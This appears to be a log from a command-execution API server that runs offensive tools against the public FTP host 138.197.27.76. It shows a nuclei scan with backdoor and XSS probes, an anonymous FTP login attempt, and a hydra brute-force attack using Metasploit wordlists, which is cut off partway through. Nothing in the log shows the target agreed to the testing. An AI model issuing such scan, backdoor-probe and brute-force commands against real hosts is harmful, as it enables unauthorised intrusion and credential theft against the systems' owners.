2025-10-24 01:32:32,974 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,974 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,978 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,979 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,982 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,982 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,986 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,036 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,053 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,054 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,064 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,068 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,101 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,108 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,113 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,114 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,115 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,115 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,115 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,118 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,118 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,119 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,119 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,120 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,121 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,121 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,144 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,174 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,192 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,305 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,317 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,318 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,331 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,349 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,366 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,369 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,383 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,384 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,391 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,393 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,393 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,395 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,395 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,398 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,399 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,401 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,404 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,405 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,435 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,443 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,451 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,575 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,579 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,583 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,592 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,626 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,630 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,630 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,644 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,647 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,652 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,660 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,664 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,664 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,664 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,667 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,669 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,673 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,673 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,677 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,700 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 2442 B/s | 3.2s | PID: 43911
2025-10-24 01:32:33,703 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,706 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [CVE-2019-19368] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/Login?!'><sVg/OnLoAD=alert`1337`//: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/Login?!'><sVg/OnLoAD=alert`1337`//"
2025-10-24 01:32:33,706 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [vmware-ftp-server] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/login: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/login"
2025-10-24 01:32:33,706 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [ftp-credentials-exposure] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/ftpsync.settings: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/ftpsync.settings"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [starnet-dmb-bs-ftp-credentials-disclosure] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/dmb/out/taskexport.jsp?taskcode: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/dmb/out/taskexport.jsp?taskcode"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [ftpconfig] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/.ftpconfig: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/.ftpconfig"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [ws-ftp-ini] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/ws_ftp.ini: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/ws_ftp.ini"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [ws-ftp-log] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/WS_FTP.LOG: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/WS_FTP.LOG"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [web-ftp-detect] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21/cgi-bin/upload/web-ftp.cgi: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21/cgi-bin/upload/web-ftp.cgi"
2025-10-24 01:32:33,712 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [wing-ftp-service-detect] Could not execute request for ftp://138.197.27.76:21: cause="http: could not dump request: ftp://138.197.27.76:21: unsupported protocol scheme \"ftp\"" chain="got err while executing ftp://138.197.27.76:21"
2025-10-24 01:32:33,715 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:33,778 - __main__ - INFO - 📤 STDOUT: [[92mvsftpd-detect[0m:[1;92mversion[0m] [[94mtcp[0m] [[34minfo[0m] 138.197.27.76:21 [[96m"3.0.5"[0m]
2025-10-24 01:32:34,500 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 2628 B/s | 4.0s | PID: 43911
2025-10-24 01:32:35,301 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 2190 B/s | 4.8s | PID: 43911
2025-10-24 01:32:35,700 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:36,103 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 1887 B/s | 5.6s | PID: 43911
2025-10-24 01:32:36,754 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:36,908 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 1658 B/s | 6.4s | PID: 43911
2025-10-24 01:32:37,657 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] [proftpd-backdoor] Sent Javascript request to 138.197.27.76:21
2025-10-24 01:32:37,709 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 1485 B/s | 7.2s | PID: 43911
2025-10-24 01:32:37,981 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [proftpd-backdoor] Could not execute request for ftp://138.197.27.76:21: ReferenceError: exit is not defined at <eval>:16:5(74)
2025-10-24 01:32:38,509 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 1354 B/s | 8.0s | PID: 43911
2025-10-24 01:32:39,313 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 1231 B/s | 8.8s | PID: 43911
2025-10-24 01:32:40,113 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.2%[0m Speed: 1129 B/s | 9.6s | PID: 43911
2025-10-24 01:32:40,700 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] could not read more data from 138.197.27.76:21: read tcp 192.168.15.50:47792->138.197.27.76:21: i/o timeout
2025-10-24 01:32:40,914 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.5%[0m Speed: 1054 B/s | 10.4s | PID: 43911
2025-10-24 01:32:41,714 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.7%[0m Speed: 978 B/s | 11.2s | PID: 43911
2025-10-24 01:32:41,754 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] could not read more data from 138.197.27.76:21: read tcp 192.168.15.50:48746->138.197.27.76:21: i/o timeout
2025-10-24 01:32:42,515 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.0%[0m Speed: 923 B/s | 12.0s | PID: 43911
2025-10-24 01:32:43,316 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.3%[0m Speed: 866 B/s | 12.8s | PID: 43911
2025-10-24 01:32:44,117 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.5%[0m Speed: 815 B/s | 13.6s | PID: 43911
2025-10-24 01:32:44,920 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.8%[0m Speed: 770 B/s | 14.4s | PID: 43911
2025-10-24 01:32:45,329 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] [CVE-2011-2523] Could not make network request for (138.197.27.76:6200) : could not connect to server: cause="context cancelled before establishing connection" address=138.197.27.76:6200 chain="context deadline exceeded"
2025-10-24 01:32:45,330 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Scan completed in 13.083414512s. 2 matches found.
2025-10-24 01:32:45,353 - __main__ - INFO - 🧹 CLEANUP: Process 43911 removed from registry
2025-10-24 01:32:45,353 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 14.86s
2025-10-24 01:32:45,353 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:32:45,353 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m nuclei -u ftp://138.197.27.76:21 -tags ftp -v
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 14.86s
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 11402 bytes
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:32:45,353 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:32:45,353 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:32:45,353 - __main__ - INFO - 💾 Cached result for command: nuclei -u ftp://138.197.27.76:21 -tags ftp -v
2025-10-24 01:32:45,353 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:32:45] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:32:56,680 - __main__ - INFO - 🔍 Cache MISS for command: ftp -n 138.197.27.76 21 <<EOF
user anonymous
pass anonymous@example.com
ls
quit
EOF
2025-10-24 01:32:56,680 - __main__ - INFO - 🚀 EXECUTING: ftp -n 138.197.27.76 21 <<EOF
user anonymous
pass anonymous@example.com
ls
quit
EOF
2025-10-24 01:32:56,681 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:32:56,681 - __main__ - INFO - 🆔 PROCESS: PID 44004 started
2025-10-24 01:32:56,681 - __main__ - INFO - 🆔 REGISTERED: Process 44004 - ftp -n 138.197.27.76 21 <<EOF
user anonymous
pass ...
2025-10-24 01:32:56,682 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44004
2025-10-24 01:32:57,483 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 0 B/s | 0.8s | PID: 44004
2025-10-24 01:32:58,283 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 0 B/s | 1.6s | PID: 44004
2025-10-24 01:32:59,084 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 0 B/s | 2.4s | PID: 44004
2025-10-24 01:32:59,810 - __main__ - INFO - 📤 STDOUT: Login incorrect.
2025-10-24 01:32:59,811 - __main__ - INFO - 📤 STDOUT: Login failed.
2025-10-24 01:32:59,886 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 10 B/s | 3.2s | PID: 44004
2025-10-24 01:33:00,071 - __main__ - INFO - 📤 STDOUT: Please login with USER and PASS.
2025-10-24 01:33:00,197 - __main__ - INFO - 📤 STDOUT: Please login with USER and PASS.
2025-10-24 01:33:00,197 - __main__ - WARNING - 📥 STDERR: Password: ftp: Can't bind for data connection: Address already in use
2025-10-24 01:33:00,359 - __main__ - INFO - 🧹 CLEANUP: Process 44004 removed from registry
2025-10-24 01:33:00,359 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 3.68s
2025-10-24 01:33:00,359 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:33:00,359 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m ftp -n 138.197.27.76 21 <<EOF
2025-10-24 01:33:00,359 - __main__ - INFO - user anonymous
2025-10-24 01:33:00,359 - __main__ - INFO - pass anony...
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 3.68s
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 167 bytes
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:33:00,359 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:33:00,359 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:33:00,359 - __main__ - INFO - 💾 Cached result for command: ftp -n 138.197.27.76 21 <<EOF
user anonymous
pass anonymous@example.com
ls
quit
EOF
2025-10-24 01:33:00,360 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:33:00] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:33:53,302 - __main__ - INFO - 🔍 Cache MISS for command: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://138.197.27.76:21 -t 4 -f
2025-10-24 01:33:53,303 - __main__ - INFO - 🚀 EXECUTING: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://138.197.27.76:21 -t 4 -f
2025-10-24 01:33:53,303 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:33:53,303 - __main__ - INFO - 🆔 PROCESS: PID 44124 started
2025-10-24 01:33:53,304 - __main__ - INFO - 🆔 REGISTERED: Process 44124 - hydra -L /usr/share/wordlists/metasploit/unix_user...
2025-10-24 01:33:53,309 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44124
2025-10-24 01:33:53,579 - __main__ - INFO - 📤 STDOUT: Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
2025-10-24 01:33:53,579 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:33:53,579 - __main__ - INFO - 📤 STDOUT: Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-24 01:33:53
2025-10-24 01:33:53,590 - __main__ - INFO - 📤 STDOUT: [DATA] max 4 tasks per 1 server, overall 4 tasks, 178675 login tries (l:175/p:1021), ~44669 tries per task
2025-10-24 01:33:53,591 - __main__ - INFO - 📤 STDOUT: [DATA] attacking ftp://138.197.27.76:21/
2025-10-24 01:33:54,110 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 549 B/s | 0.8s | PID: 44124
2025-10-24 01:33:54,912 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 275 B/s | 1.6s | PID: 44124
2025-10-24 01:33:55,713 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 183 B/s | 2.4s | PID: 44124
2025-10-24 01:33:56,513 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 137 B/s | 3.2s | PID: 44124
2025-10-24 01:33:57,314 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 110 B/s | 4.0s | PID: 44124
2025-10-24 01:33:58,115 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 92 B/s | 4.8s | PID: 44124
2025-10-24 01:33:58,915 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 78 B/s | 5.6s | PID: 44124
2025-10-24 01:33:59,716 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 69 B/s | 6.4s | PID: 44124
2025-10-24 01:34:00,516 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 61 B/s | 7.2s | PID: 44124
2025-10-24 01:34:01,317 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 55 B/s | 8.0s | PID: 44124
2025-10-24 01:34:02,117 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 50 B/s | 8.8s | PID: 44124
2025-10-24 01:34:02,918 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.2%[0m Speed: 46 B/s | 9.6s | PID: 44124
2025-10-24 01:34:03,718 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.5%[0m Speed: 42 B/s | 10.4s | PID: 44124
2025-10-24 01:34:04,519 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m3.7%[0m Speed: 39 B/s | 11.2s | PID: 44124
2025-10-24 01:34:05,321 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.0%[0m Speed: 37 B/s | 12.0s | PID: 44124
2025-10-24 01:34:06,122 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.3%[0m Speed: 34 B/s | 12.8s | PID: 44124
2025-10-24 01:34:06,922 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.5%[0m Speed: 32 B/s | 13.6s | PID: 44124
2025-10-24 01:34:07,724 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m4.8%[0m Speed: 31 B/s | 14.4s | PID: 44124
